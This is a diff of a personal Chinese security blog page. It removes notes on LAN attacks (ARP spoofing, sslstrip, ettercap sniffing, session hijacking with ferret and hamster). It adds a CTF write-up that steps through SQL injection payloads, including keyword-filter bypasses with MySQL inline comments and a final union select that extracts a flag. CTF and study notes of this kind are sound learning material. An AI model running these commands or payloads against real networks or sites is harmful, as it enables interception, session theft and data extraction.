@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql," />
 
 
 
@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig">
-<meta name="keywords">
+<meta name="description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
+<meta name="keywords" content="sql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lan attack">
-<meta property="og:url" content="http://Merl1ng.com/2017/05/30/lan attack/index.html">
+<meta property="og:title" content="记第一道sql注入">
+<meta property="og:url" content="http://Merl1ng.com/2017/08/02/记第一道sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig">
-<meta property="og:updated_time" content="2017-07-25T06:13:17.443Z">
+<meta property="og:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
+<meta property="og:updated_time" content="2017-08-02T16:01:17.440Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="lan attack">
-<meta name="twitter:description" content="内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig">
+<meta name="twitter:title" content="记第一道sql注入">
+<meta name="twitter:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/05/30/lan attack/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/08/02/记第一道sql注入/"/>
 
 
 
 
 
-  <title>lan attack | Merl1ng</title>
+  <title>记第一道sql注入 | Merl1ng</title>
   
 
 
@@ -266,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/05/30/lan attack/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/02/记第一道sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Saber">
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">lan attack</h1>
+          <h1 class="post-title" itemprop="name headline">记第一道sql注入</h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-30T23:13:26+08:00">
-                2017-05-30
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-02T22:56:28+08:00">
+                2017-08-02
               </time>
             
 
@@ -318,8 +318,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/lan/" itemprop="url" rel="index">
-                    <span itemprop="name">lan</span>
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
                   </a>
                 </span>
 
@@ -352,15 +352,17 @@
       
 
       
-        <p>内网视频学习笔记(￣▽￣)~*</p>
-<h3 id="局域网断网攻击"><a href="#局域网断网攻击" class="headerlink" title="局域网断网攻击"></a>局域网断网攻击</h3><p>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig<br><a id="more"></a></p>
-<h3 id="arp-欺骗"><a href="#arp-欺骗" class="headerlink" title="arp 欺骗"></a>arp 欺骗</h3><p>先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显<br>可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward<br>再arpspoof …</p>
-<h3 id="driffnet-获取本机网卡图片"><a href="#driffnet-获取本机网卡图片" class="headerlink" title="driffnet 获取本机网卡图片"></a>driffnet 获取本机网卡图片</h3><p>driffnet -i 网卡<br>会弹一个小窗口<br>可在/tmp内找到图片</p>
-<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>ettercap dns欺骗 流量嗅探<br>先arp欺骗 再 ettercap-Tq-i eth0<br>(Tq 启动文本模式 q安静模式)</p>
-<h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>sslstrip 将https链接还原为http （缺点：证书错误）<br>首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出<br>vim/etc/ettercap/etter.conf<br>光标移动到 linux 删除下两个# 设置完成<br>sslstrip -a -f -k</p>
-<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>way1 先arp欺骗<br>wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量<br>输入wireshark 为图形界面<br>抓包并保存为QAQ.pacp文件<br>再ferret -r QAQ.pacp<br>生成txt文件 将该文件复制到<br>cp hamster.txt /root/<br>输入 hamster 根据提示<br>修改浏览器代理设置<br>进入网址</p>
-<p>way2<br>ferret -i eth0(网卡)<br>浏览器设置同上<br>再hamster （若有hamster文件存在需先删除）<br>进入网址同步获取</p>
-<p>way3<br><em>cookie cadger</em><br>工具一键劫持</p>
+        <p>正在学习sql注入 差不多完整理解了一道注入题<br>把方法和思路记录下来(&gt;ω&lt;)<br><a id="more"></a><br>首先提交1 即?id=1 得到<br>ID: 1<br>name: baloteli</p>
+<p>提交1’ 报错  near ‘’1’’’<br>说明单引号影响了语句 且sql语句中id值两旁有 ‘ ‘ -&gt;要闭合单引号<br>网页中SELECT语句大致语法为 SELECT * FROM users WHERE id = ‘$id’</p>
+<p>然后提交 1’or ‘’=’<br>得到<br>ID: 1’ or ‘’=’<br>name: baloteli<br>ID: 1’ or ‘’=’<br>name: kanawaluo<br>ID: 1’ or ‘’=’<br>name: dengdeng<br>即分别提交 1 2 3 所显示的消息<br>并且可以得知 or没有被过滤</p>
+<p>试下and关键字<br>两种同样写法 (为了闭合单引号)<br>1’ and ‘1’=’1 没反应<br>1’ and 1=1 or’’=’ 报错<br>第一种更简洁 但是第二种回显效果更好<br>说明and被过滤</p>
+<p>1’ /<em>and</em>/ ‘1’=’1<br>1’ /<em>and</em>/ 1=1 or’’=’<br>均同上 说明还是不行 and被过滤</p>
+<p>1’ /<em>!and</em>/ ‘1’=’1 只回显了id为1的值<br>1’ /<em>!and</em>/ 1=1 or’’=’ 回显了id为1 2 3的值<br>成功绕过</p>
+<p>猜表名<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ <em> /</em>!from<em>/ admin) /</em>!and<em>/ ‘’=’<br>报错Table ‘web10.admin’ doesn’t exist<br>换flag猜下<br>?id=’ or /</em>!exists<em>/ (/</em>!select<em>/ </em> /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>可以，那么就猜列名<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ id /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ name /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>都可以</p>
+<p>联合查询 加上/<em>!where</em>/ ‘’=’是为了闭合单引号<br>?id=’ /<em>!union</em>/ /<em>!select</em>/ 1,2 /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>报错The used SELECT statements have a different number of columns<br>?id=’ /<em>!union</em>/ /<em>!select</em>/ 1 /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>可以 所以当前表只查找一列</p>
+<p>?id=’ /<em>!union</em>/ /<em>!select</em>/ name /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>报错Unknown column ‘name’ in ‘field list’<br>这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列</p>
+<p><em>实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过</em></p>
+<p>最终的查询语句为<br><code>&#39;unionunion  selectselect  flag fromfrom  flag wherewhere &#39;&#39;=&#39;</code><br>或者<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code></p>
 
       
     </div>
@@ -388,6 +390,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" rel="tag"># sql</a>
+          
+        </div>
+      
 
       
       
@@ -397,18 +405,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/18/一句话木马和中国菜刀/" rel="next" title="一句话木马和中国菜刀">
-                <i class="fa fa-chevron-left"></i> 一句话木马和中国菜刀
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/30/环境变量/" rel="prev" title="环境变量">
-                环境变量 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/07/30/javascript伪协议与作用域/" rel="prev" title="javascript伪协议与作用域">
+                javascript伪协议与作用域 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -457,17 +461,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel">
+      <section class="site-overview sidebar-panel sidebar-panel-active">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -549,22 +544,6 @@
 
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#局域网断网攻击"><span class="nav-number">1.</span> <span class="nav-text">局域网断网攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arp-欺骗"><span class="nav-number">2.</span> <span class="nav-text">arp 欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#driffnet-获取本机网卡图片"><span class="nav-number">3.</span> <span class="nav-text">driffnet 获取本机网卡图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http"><span class="nav-number">4.</span> <span class="nav-text">http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#https"><span class="nav-number">5.</span> <span class="nav-text">https</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话劫持"><span class="nav-number">6.</span> <span class="nav-text">会话劫持</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
